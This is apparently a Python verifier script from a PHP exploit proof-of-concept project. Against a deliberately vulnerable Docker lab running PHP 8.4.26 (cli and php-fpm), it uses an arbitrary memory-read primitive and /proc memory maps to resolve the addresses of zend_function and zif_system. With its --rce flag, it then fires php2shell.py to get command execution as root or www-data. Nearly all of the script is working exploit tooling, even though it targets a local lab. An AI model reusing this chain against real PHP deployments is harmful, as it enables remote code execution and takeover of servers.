#!/usr/bin/env python3
"""Verifier for rtc_transplant_resolver.py on the live rvt lab (cli + php-fpm
8.4.26).

Per SAPI (cli -> uid=0, fpm -> uid=www-data) it asserts: the cached run-time-
cache cluster is sourced INDEX-RELATIVELY (no binbase, no EG anchor); the
transplant resolve (eg_off FORBIDDEN, no anchor_slots positional map) yields fn
(quotemeta's zend_function) and &zif_system MATCHING ground truth via
delta-consensus + one handler read + one .text delta; delta-consensus drops the
positional anchor_slots map; the fn+0x08 name-read de-hardcoding is UNRELIABLE
over this read primitive (reported, not a wall); resolve() with no cluster
falls back to the EG(function_table) name-walk and returns the SAME
{name:{fn,handler}} shape/values as functable_resolver.FunctionTableWalker; and
(optional, --rce) the transplant-derived fn/&zif_system fire the RCE.

Brings the rvt lab up if needed (docker-compose.versions.yml --profile rvt,
project p2s-rvt; rvt-cli-vuln on host :8172, rvt-fpm-vuln behind web-vuln
internally). Leaves it running unless --down. Run with python3 -I.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import re
import subprocess
import sys
import time
import urllib.request

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
_ROOT = os.path.dirname(_POC_ROOT)                   # project root
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

COMPOSE = os.path.join(_ROOT, "docker-compose.versions.yml")
# Route every `docker compose exec` in the shared modules at the rvt project.
os.environ["COMPOSE_FILE"] = COMPOSE
os.environ["COMPOSE_PROJECT_NAME"] = "p2s-rvt"


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


A = _load("var_hash_rw", "var_hash_rw.py")
R5 = _load("functable_resolver", "functable_resolver.py")
RVT = _load("rtc_transplant_resolver", "rtc_transplant_resolver.py")
from common.offsets import BUILTIN_OFFSETS


# lab bring-up + SAPI-aware bootstrap.
def _dexec(service, *argv):
    return subprocess.run(["docker", "compose", "exec", "-T", service] +
                          list(argv), capture_output=True, text=True).stdout


def _cli_up(port):
    try:
        urllib.request.urlopen(f"http://127.0.0.1:{port}/index.php",
                               timeout=4).read()
        return True
    except Exception:
        return False


def ensure_lab(port):
    if _cli_up(port):
        print(f"[lab] rvt lab already up (cli on :{port})")
        return True
    print("[lab] bringing the rvt lab up (docker compose -f "
          "docker-compose.versions.yml -p p2s-rvt --profile rvt up -d --build)...")
    subprocess.run(["docker", "compose", "-p", "p2s-rvt", "--profile", "rvt",
                    "-f", COMPOSE, "up", "-d", "--build"],
                   cwd=_ROOT, capture_output=True, text=True)
    for _ in range(60):
        if _cli_up(port):
            print(f"[lab] up (cli on :{port})")
            return True
        time.sleep(1)
    return False


def bootstrap_sapi(sapi):
    """Return (binbase, chunk, url, service). cli: /proc/1/maps is the php -S
    worker. fpm: PID 1 is the master, so read the one pool WORKER's maps for the
    request-heap chunk (the master never allocates it)."""
    if sapi == "cli":
        service, url = "rvt-cli-vuln", "http://127.0.0.1"
        binbase, chunk = R5.bootstrap(service, url)
        return binbase, chunk, url, service
    service, url = "rvt-fpm-vuln", "http://web-vuln"
    _dexec(service, "curl", "-s", "-o", "/dev/null", url + "/index.php")
    worker = None
    for pid in _dexec(service, "sh", "-c",
                      "ls /proc | grep -E '^[0-9]+$'").split():
        if pid == "1":
            continue
        cl = _dexec(service, "sh", "-c",
                    f"cat /proc/{pid}/cmdline 2>/dev/null | tr '\\0' ' '")
        if "pool www" in cl:
            worker = pid
            break
    if not worker:
        return None, None, url, service
    maps = _dexec(service, "cat", f"/proc/{worker}/maps")
    binbase = chunk = None
    for line in maps.splitlines():
        p = line.split(None, 5)
        if len(p) < 5 or "-" not in p[0]:
            continue
        s, e = (int(x, 16) for x in p[0].split("-"))
        path = p[5].strip() if len(p) > 5 else ""
        if path.endswith("/php-fpm") and binbase is None:
            binbase = s
        if (path == "" and p[1] == "rw-p" and p[2] == "00000000"
                and (e - s) >= 0x200000 and e % 0x200000 == 0 and chunk is None):
            chunk = e - 0x200000
    return binbase, chunk, url, service


# one SAPI's checks.
def run_sapi(sapi, do_rce):
    checks = []
    binbase, chunk, url, service = bootstrap_sapi(sapi)
    if not binbase or not chunk:
        checks.append((f"[{sapi}] bootstrap", False,
                       f"binbase={binbase} chunk={chunk}"))
        return checks, None
    off = BUILTIN_OFFSETS["8.4.26-fpm" if sapi == "fpm" else "8.4.26"]
    gt_zsys, gt_qm = binbase + off["zif_system"], binbase + off["zif_quotemeta"]
    aoff = chunk + off["a_off"]
    seed = {"chunk": chunk, "binbase": binbase, "a": aoff,
            "copy": aoff + off["copy_off"], "sid": aoff + off["sid_off"],
            "ht_post": chunk + R5.HT_POST_OFF[sapi],
            "bg_unserialize_off": off["bg_unserialize_off"]}
    rdr = A.ArbRead(url, seed, service=service, want_sidpath=True,
                    survive=True, verbose=False)
    print(f"[{sapi}] binbase={binbase:#x} chunk={chunk:#x}")

    # A. index-relative cluster sourcing (no binbase/EG to OBTAIN it)
    cluster = RVT.leak_cluster(service, url, binbase, chunk, off, sapi)
    heap_ok = (len(cluster) >= 5 and
               all(0x100000000000 <= c < 0x800000000000 for c in cluster) and
               all(not binbase <= c < binbase + 0x1700000 for c in cluster))
    checks.append((f"[{sapi}] A cluster sourced index-relatively "
                   f"(correctly based, no binbase/EG)", heap_ok,
                   f"{len(cluster)} cached fn ptrs: "
                   f"{[hex(c) for c in cluster[:3]]}..."))

    # B+C. transplant resolve with EG FORBIDDEN and no anchor_slots
    rv = RVT.RVTResolver(rdr, binbase=binbase, eg_off=None, off=off,
                         verbose=False)
    res = rv.resolve_from_cluster(cluster)
    fn = res and res["quotemeta"]["fn"]
    zqm = res and res["quotemeta"]["handler"]
    zsys = res and res["system"]["handler"]
    b_ok = bool(res and fn and zqm == gt_qm and zsys == gt_zsys)
    checks.append((f"[{sapi}] B transplant resolve == ground truth "
                   f"(no EG_off, handler read + .text delta)", b_ok,
                   f"fn={fn and hex(fn)} &zif_system={zsys and hex(zsys)} "
                   f"(GT {gt_zsys:#x})"))
    c_ok = bool(res and res.get("_votes", 0) >= 5)
    checks.append((f"[{sapi}] C delta-CONSENSUS drops the anchor_slots map "
                   f"(order-independent)", c_ok,
                   f"quotemeta agreed by {res and res.get('_votes')} of "
                   f"{len(cluster)} members"))

    # D. name-read residual (reported; the resolve does not depend on it)
    nm = rv.read_name(fn) if fn else None
    checks.append((f"[{sapi}] D name-read de-hardcoding is UNRELIABLE over this "
                   f"primitive (documented residual)", nm is None,
                   f"read_name(quotemeta fn) -> {nm!r} (truncates; "
                   f"delta-consensus used instead)"))

    # E. backward-compat: no-cluster -> EG-walk fallback, same shape + values
    rv2 = RVT.RVTResolver(rdr, binbase=binbase, eg_off=R5.EG_OFF[sapi],
                          off=off, verbose=False)
    fb = rv2.resolve(cluster_fns=None, names=("system", "quotemeta"))
    e_ok = (fb.get("_path") == "eg-walk-fallback"
            and fb["quotemeta"]["fn"] == fn
            and fb["system"]["handler"] == gt_zsys)
    checks.append((f"[{sapi}] E backward-compat: no-cluster falls back to the "
                   f"EG-walk, same shape/values", e_ok,
                   f"fallback path={fb.get('_path')} "
                   f"fn={fb.get('quotemeta', {}).get('fn') and hex(fb['quotemeta']['fn'])}"))

    uid = None
    if do_rce and b_ok:
        cmd = [sys.executable, os.path.join(_POC_ROOT, "php2shell.py"),
               "var-hash-rw", url, "--service", service, "--mode", "rce",
               "--a", hex(aoff), "--copy", hex(aoff + off["copy_off"]),
               "--binbase", hex(binbase), "--fn", hex(fn), "--zsys", hex(zsys)]
        r = subprocess.run(cmd, capture_output=True, text=True,
                           env={**os.environ})
        m = re.search(r"uid=\d+\([a-z0-9_-]+\)", r.stdout)
        uid = m.group(0) if m else None
        want = "root" if sapi == "cli" else "www-data"
        checks.append((f"[{sapi}] F transplant-derived RCE fires", bool(uid),
                       f"{uid} (want {want})"))
    return checks, uid


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--port", type=int, default=8172)
    ap.add_argument("--sapi", choices=["cli", "fpm", "both"], default="both")
    ap.add_argument("--rce", action="store_true",
                    help="also fire var-hash-rw RCE with the transplant-derived set")
    ap.add_argument("--down", action="store_true",
                    help="docker compose down after the asserts")
    a = ap.parse_args(argv)

    if not ensure_lab(a.port):
        print("[FAIL] could not bring the rvt lab up")
        return 2

    sapis = ["cli", "fpm"] if a.sapi == "both" else [a.sapi]
    all_checks = []
    for s in sapis:
        print(f"\n########## SAPI: {s} ##########")
        try:
            ch, _ = run_sapi(s, a.rce)
        except Exception as e:                                # pragma: no cover
            ch = [(f"[{s}] run", False, f"exception: {e!r}")]
        all_checks += ch

    print("\n" + "=" * 90)
    print("VERIFY rtc_transplant_resolver")
    print("=" * 90)
    allok = True
    for name, ok, detail in all_checks:
        allok = allok and ok
        print(f"  [{'PASS' if ok else 'FAIL'}] {name}")
        print(f"         {detail}")
    print("-" * 90)
    print("  VERDICT: the R:-transplant de-hardcodes the SOURCING (index-"
          "relative cached pointers,\n    no binbase/EG) and the IDENTITY map "
          "(delta-consensus drops anchor_slots), and reads\n    &zif_system "
          "(handler + .text delta, no absolute zif offset). It does NOT reach a "
          "zero-\n    per-build-offset resolve: the cached->quotemeta hop stays "
          "a build-stable structural\n    delta (R: supplies the VALUE, not the\n    "
          "cross-structure NAVIGATION). Residual: anchor_deltas + one .text "
          "delta, both auto-\n    derivable once per build. Backward-compatible "
          "(EG-walk + table fallbacks intact).")
    print("=" * 90)
    print(f"\n{'ALL CHECKS PASS' if allok else 'SOME CHECKS FAILED'}")

    if a.down:
        print("[lab] docker compose down")
        subprocess.run(["docker", "compose", "-p", "p2s-rvt", "--profile",
                        "rvt", "-f", COMPOSE, "down"],
                       cwd=_ROOT, capture_output=True, text=True)
    return 0 if allok else 1


if __name__ == "__main__":
    raise SystemExit(main())
